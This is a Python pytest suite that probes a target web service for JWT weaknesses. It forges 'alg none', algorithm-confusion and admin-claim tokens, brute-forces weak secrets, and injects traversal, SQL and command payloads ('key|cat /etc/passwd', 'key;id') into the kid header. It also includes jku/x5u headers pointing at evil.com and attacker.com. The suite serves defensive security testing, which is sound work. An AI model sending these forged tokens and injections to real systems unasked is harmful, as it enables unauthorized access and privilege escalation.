"""
JWT (JSON Web Token) Security Tests

Tests for JWT implementation vulnerabilities including algorithm confusion,
signature bypass, key injection, and token manipulation attacks.

References:
- https://portswigger.net/web-security/jwt
- https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- https://github.com/ticarpi/jwt_tool
"""

import base64
import hashlib
import hmac
import json
import pytest
import requests
import re
from urllib.parse import urlparse


def base64url_encode(data):
    """Base64URL encode without padding."""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def base64url_decode(data):
    """Base64URL decode with padding restoration."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def create_jwt(header, payload, secret=""):
    """Create a JWT token with given header, payload, and optional secret."""
    header_b64 = base64url_encode(json.dumps(header))
    payload_b64 = base64url_encode(json.dumps(payload))

    message = f"{header_b64}.{payload_b64}"

    if header.get("alg") == "none":
        signature = ""
    elif header.get("alg") == "HS256":
        signature = base64url_encode(
            hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        )
    elif header.get("alg") == "HS384":
        signature = base64url_encode(
            hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
        )
    elif header.get("alg") == "HS512":
        signature = base64url_encode(
            hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
        )
    else:
        signature = base64url_encode(b"invalid_signature")

    return f"{message}.{signature}"


# Common weak secrets for brute force testing
WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "private",
    "jwt_secret",
    "your-256-bit-secret",
    "your-secret-key",
    "supersecret",
    "changeme",
    "test",
    "development",
    "production",
    "",
]

# JWT Header attacks
JWT_HEADER_ATTACKS = [
    # Algorithm "none" attack
    {"alg": "none", "typ": "JWT"},
    {"alg": "None", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},
    {"alg": "nOnE", "typ": "JWT"},

    # Algorithm confusion (RS256 -> HS256)
    {"alg": "HS256", "typ": "JWT"},
    {"alg": "HS384", "typ": "JWT"},
    {"alg": "HS512", "typ": "JWT"},

    # JKU (JSON Web Key Set URL) injection
    {"alg": "RS256", "typ": "JWT", "jku": "http://evil.com/jwks.json"},
    {"alg": "RS256", "typ": "JWT", "jku": "https://attacker.com/.well-known/jwks.json"},

    # JWK (JSON Web Key) embedded
    {"alg": "RS256", "typ": "JWT", "jwk": {"kty": "RSA", "n": "test", "e": "AQAB"}},

    # KID (Key ID) injection - directory traversal
    {"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"},
    {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"},
    {"alg": "HS256", "typ": "JWT", "kid": "../../etc/passwd"},
    {"alg": "HS256", "typ": "JWT", "kid": "key.pem"},

    # KID SQL injection
    {"alg": "HS256", "typ": "JWT", "kid": "key' UNION SELECT 'secret'--"},
    {"alg": "HS256", "typ": "JWT", "kid": "key' OR '1'='1"},

    # X5U (X.509 URL) injection
    {"alg": "RS256", "typ": "JWT", "x5u": "http://evil.com/cert.pem"},

    # X5C (X.509 Certificate Chain) injection
    {"alg": "RS256", "typ": "JWT", "x5c": ["MIIC..."]},

    # CVE-2018-0114 - crit header
    {"alg": "HS256", "typ": "JWT", "crit": ["exp"]},
]

# Standard test payloads
JWT_PAYLOAD_ATTACKS = [
    # Admin privilege escalation
    {"sub": "admin", "role": "admin", "admin": True},
    {"user": "admin", "isAdmin": True, "role": "administrator"},
    {"username": "admin", "roles": ["admin", "superuser"]},

    # User ID manipulation
    {"sub": "1", "user_id": 1},
    {"sub": "0", "user_id": 0},  # Often admin

    # Expired token removal
    {"sub": "user"},  # No exp claim

    # Far future expiration
    {"sub": "user", "exp": 9999999999},
    {"sub": "user", "exp": 2147483647},

    # Negative/past iat
    {"sub": "user", "iat": 0},
    {"sub": "user", "iat": -1},

    # Audience bypass
    {"sub": "user", "aud": "*"},
    {"sub": "user", "aud": ""},

    # Issuer manipulation
    {"sub": "user", "iss": "trusted-issuer"},
    {"sub": "user", "iss": ""},
]


class TestJWTSecurity:
    """Tests for JWT security vulnerabilities."""

    @pytest.fixture(autouse=True)
    def setup(self, target_url, session):
        self.target_url = target_url
        self.session = session
        self.jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*')

    def find_jwt_in_response(self, response):
        """Find JWT tokens in response headers and body."""
        tokens = []

        # Check headers
        for header, value in response.headers.items():
            matches = self.jwt_pattern.findall(str(value))
            tokens.extend(matches)

        # Check body
        matches = self.jwt_pattern.findall(response.text)
        tokens.extend(matches)

        # Check cookies
        for cookie in response.cookies:
            if self.jwt_pattern.match(cookie.value):
                tokens.append(cookie.value)

        return list(set(tokens))

    def decode_jwt(self, token):
        """Decode JWT without verification."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, None

            header = json.loads(base64url_decode(parts[0]))
            payload = json.loads(base64url_decode(parts[1]))
            return header, payload
        except:
            return None, None

    @pytest.mark.jwt
    @pytest.mark.security
    def test_algorithm_none_attack(self, target_url, session):
        """Test for 'alg: none' vulnerability (CVE-2015-9235)."""
        findings = []

        # First, try to get a valid token
        login_endpoints = ["/api/login", "/login", "/auth", "/api/auth", "/api/token"]
        valid_token = None

        for endpoint in login_endpoints:
            url = f"{target_url.rstrip('/')}{endpoint}"
            try:
                response = session.post(
                    url,
                    json={"username": "test", "password": "test"},
                    timeout=10
                )
                tokens = self.find_jwt_in_response(response)
                if tokens:
                    valid_token = tokens[0]
                    break
            except:
                continue

        # Create "none" algorithm tokens
        none_headers = [
            {"alg": "none", "typ": "JWT"},
            {"alg": "None", "typ": "JWT"},
            {"alg": "NONE", "typ": "JWT"},
            {"alg": "nOnE", "typ": "JWT"},
        ]

        admin_payload = {"sub": "admin", "role": "admin", "admin": True, "exp": 9999999999}

        protected_endpoints = ["/api/user", "/api/admin", "/api/profile", "/dashboard", "/admin"]

        for header in none_headers:
            # Create token with no signature
            token = create_jwt(header, admin_payload)
            # Also try with empty signature explicitly
            parts = token.split('.')
            token_empty_sig = f"{parts[0]}.{parts[1]}."

            for test_token in [token, token_empty_sig]:
                for endpoint in protected_endpoints:
                    url = f"{target_url.rstrip('/')}{endpoint}"

                    try:
                        response = session.get(
                            url,
                            headers={"Authorization": f"Bearer {test_token}"},
                            timeout=10
                        )

                        # Check if token was accepted
                        if response.status_code in [200, 201, 302]:
                            if "unauthorized" not in response.text.lower() and "invalid" not in response.text.lower():
                                findings.append({
                                    "endpoint": endpoint,
                                    "header": header,
                                    "status": response.status_code,
                                    "vulnerability": "Algorithm None accepted",
                                })

                    except requests.RequestException:
                        continue

        if findings:
            pytest.fail(
                f"CRITICAL: Algorithm 'none' vulnerability detected! "
                f"Server accepts unsigned JWT tokens. Findings: {findings}"
            )

    @pytest.mark.jwt
    @pytest.mark.security
    def test_algorithm_confusion(self, target_url, session):
        """Test for algorithm confusion attack (RS256 -> HS256)."""
        findings = []

        # This attack works when server uses RS256 but accepts HS256
        # The attacker uses the public key as HMAC secret

        attack_tokens = []

        # Create HS256 tokens that might work if server has algorithm confusion
        for payload in JWT_PAYLOAD_ATTACKS[:5]:
            token = create_jwt({"alg": "HS256", "typ": "JWT"}, payload, secret="")
            attack_tokens.append(token)

        protected_endpoints = ["/api/user", "/api/profile", "/api/admin", "/protected"]

        for token in attack_tokens:
            for endpoint in protected_endpoints:
                url = f"{target_url.rstrip('/')}{endpoint}"

                try:
                    response = session.get(
                        url,
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=10
                    )

                    if response.status_code == 200:
                        if "unauthorized" not in response.text.lower():
                            findings.append({
                                "endpoint": endpoint,
                                "status": response.status_code,
                            })

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(f"Potential algorithm confusion vulnerability: {findings}")

    @pytest.mark.jwt
    @pytest.mark.security
    def test_weak_secret_brute_force(self, target_url, session):
        """Test for weak JWT signing secrets."""
        findings = []

        # First get a valid token to crack
        login_endpoints = ["/api/login", "/login", "/auth", "/api/auth"]
        valid_token = None

        for endpoint in login_endpoints:
            url = f"{target_url.rstrip('/')}{endpoint}"
            try:
                response = session.post(
                    url,
                    json={"username": "test", "password": "test"},
                    timeout=10
                )
                tokens = self.find_jwt_in_response(response)
                if tokens:
                    valid_token = tokens[0]
                    break
            except:
                continue

        if not valid_token:
            pytest.skip("No JWT token found to test")

        header, payload = self.decode_jwt(valid_token)
        if not header or header.get("alg") not in ["HS256", "HS384", "HS512"]:
            pytest.skip("Token doesn't use HMAC algorithm")

        # Try weak secrets
        parts = valid_token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        original_sig = parts[2]

        for secret in WEAK_SECRETS:
            try:
                if header["alg"] == "HS256":
                    test_sig = base64url_encode(
                        hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                    )
                elif header["alg"] == "HS384":
                    test_sig = base64url_encode(
                        hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
                    )
                elif header["alg"] == "HS512":
                    test_sig = base64url_encode(
                        hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
                    )
                else:
                    continue

                if test_sig == original_sig:
                    findings.append({
                        "secret": secret if secret else "(empty)",
                        "algorithm": header["alg"],
                    })
                    break

            except Exception:
                continue

        if findings:
            pytest.fail(
                f"CRITICAL: Weak JWT secret detected! "
                f"Secret '{findings[0]['secret']}' can be used to forge tokens."
            )

    @pytest.mark.jwt
    @pytest.mark.security
    def test_kid_injection(self, target_url, session):
        """Test for KID (Key ID) header injection vulnerabilities."""
        findings = []

        kid_payloads = [
            # Directory traversal
            {"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"},
            {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"},
            {"alg": "HS256", "typ": "JWT", "kid": "../../etc/passwd"},
            {"alg": "HS256", "typ": "JWT", "kid": "../../../proc/self/environ"},

            # SQL injection
            {"alg": "HS256", "typ": "JWT", "kid": "key' UNION SELECT 'AA=='--"},
            {"alg": "HS256", "typ": "JWT", "kid": "' OR '1'='1"},

            # Command injection
            {"alg": "HS256", "typ": "JWT", "kid": "key|cat /etc/passwd"},
            {"alg": "HS256", "typ": "JWT", "kid": "key;id"},
        ]

        admin_payload = {"sub": "admin", "role": "admin", "exp": 9999999999}

        protected_endpoints = ["/api/user", "/api/admin", "/api/profile"]

        for header in kid_payloads:
            # Sign with empty string (for /dev/null attack)
            token = create_jwt(header, admin_payload, secret="")

            for endpoint in protected_endpoints:
                url = f"{target_url.rstrip('/')}{endpoint}"

                try:
                    response = session.get(
                        url,
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=10
                    )

                    # Check for successful injection
                    if response.status_code == 200:
                        response_lower = response.text.lower()
                        if "unauthorized" not in response_lower and "invalid" not in response_lower:
                            findings.append({
                                "endpoint": endpoint,
                                "kid": header.get("kid"),
                                "status": response.status_code,
                            })

                    # Check for SQL/command injection errors
                    error_sigs = ["sql", "syntax", "mysql", "postgresql", "uid=", "root:"]
                    if any(sig in response.text.lower() for sig in error_sigs):
                        findings.append({
                            "endpoint": endpoint,
                            "kid": header.get("kid"),
                            "injection_type": "error-based",
                        })

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(f"KID injection vulnerability detected: {findings}")

    @pytest.mark.jwt
    @pytest.mark.security
    def test_jku_jwk_injection(self, target_url, session):
        """Test for JKU/JWK header injection vulnerabilities."""
        findings = []

        injection_headers = [
            {"alg": "RS256", "typ": "JWT", "jku": "http://evil.com/jwks.json"},
            {"alg": "RS256", "typ": "JWT", "jku": "https://localhost/jwks.json"},
            {"alg": "RS256", "typ": "JWT", "jwk": {"kty": "RSA", "n": "test", "e": "AQAB", "use": "sig"}},
            {"alg": "RS256", "typ": "JWT", "x5u": "http://evil.com/cert.pem"},
        ]

        admin_payload = {"sub": "admin", "role": "admin", "exp": 9999999999}

        protected_endpoints = ["/api/user", "/api/admin", "/api/profile"]

        for header in injection_headers:
            token = create_jwt(header, admin_payload)

            for endpoint in protected_endpoints:
                url = f"{target_url.rstrip('/')}{endpoint}"

                try:
                    response = session.get(
                        url,
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=10
                    )

                    # Check if server tried to fetch JKU/X5U (might timeout or error)
                    if response.status_code in [200, 500, 504]:
                        findings.append({
                            "endpoint": endpoint,
                            "header_type": "jku" if "jku" in header else ("jwk" if "jwk" in header else "x5u"),
                            "status": response.status_code,
                        })

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(f"JKU/JWK injection may be possible: {findings}")

    @pytest.mark.jwt
    @pytest.mark.security
    def test_token_expiration_bypass(self, target_url, session):
        """Test if expired tokens are accepted."""
        findings = []

        # Create tokens with various expiration issues
        test_cases = [
            # No expiration
            ({"alg": "HS256", "typ": "JWT"}, {"sub": "user"}, "no_exp"),
            # Expired token
            ({"alg": "HS256", "typ": "JWT"}, {"sub": "user", "exp": 0}, "expired"),
            # Far past expiration
            ({"alg": "HS256", "typ": "JWT"}, {"sub": "user", "exp": 1}, "far_expired"),
            # Negative exp
            ({"alg": "HS256", "typ": "JWT"}, {"sub": "user", "exp": -1}, "negative_exp"),
        ]

        protected_endpoints = ["/api/user", "/api/profile", "/protected"]

        for header, payload, test_type in test_cases:
            token = create_jwt(header, payload, secret="test")

            for endpoint in protected_endpoints:
                url = f"{target_url.rstrip('/')}{endpoint}"

                try:
                    response = session.get(
                        url,
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=10
                    )

                    if response.status_code == 200:
                        if "expired" not in response.text.lower() and "invalid" not in response.text.lower():
                            findings.append({
                                "endpoint": endpoint,
                                "test_type": test_type,
                                "status": response.status_code,
                            })

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(f"Token expiration bypass detected: {findings}")

    @pytest.mark.jwt
    @pytest.mark.security
    def test_signature_stripping(self, target_url, session):
        """Test if server accepts tokens with stripped/modified signatures."""
        findings = []

        valid_header = {"alg": "HS256", "typ": "JWT"}
        admin_payload = {"sub": "admin", "role": "admin", "exp": 9999999999}

        token = create_jwt(valid_header, admin_payload, secret="doesntmatter")
        parts = token.split('.')

        # Signature manipulation tests
        test_tokens = [
            f"{parts[0]}.{parts[1]}.",  # Empty signature
            f"{parts[0]}.{parts[1]}.invalid",  # Invalid signature
            f"{parts[0]}.{parts[1]}.AAAA",  # Short signature
            f"{parts[0]}.{parts[1]}",  # No signature at all
        ]

        protected_endpoints = ["/api/user", "/api/admin", "/api/profile"]

        for test_token in test_tokens:
            for endpoint in protected_endpoints:
                url = f"{target_url.rstrip('/')}{endpoint}"

                try:
                    response = session.get(
                        url,
                        headers={"Authorization": f"Bearer {test_token}"},
                        timeout=10
                    )

                    if response.status_code == 200:
                        response_lower = response.text.lower()
                        if "unauthorized" not in response_lower and "invalid" not in response_lower:
                            findings.append({
                                "endpoint": endpoint,
                                "token_type": "stripped_signature",
                                "status": response.status_code,
                            })

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(
                f"CRITICAL: Signature verification bypass detected! "
                f"Server accepts tokens with invalid/missing signatures: {findings}"
            )
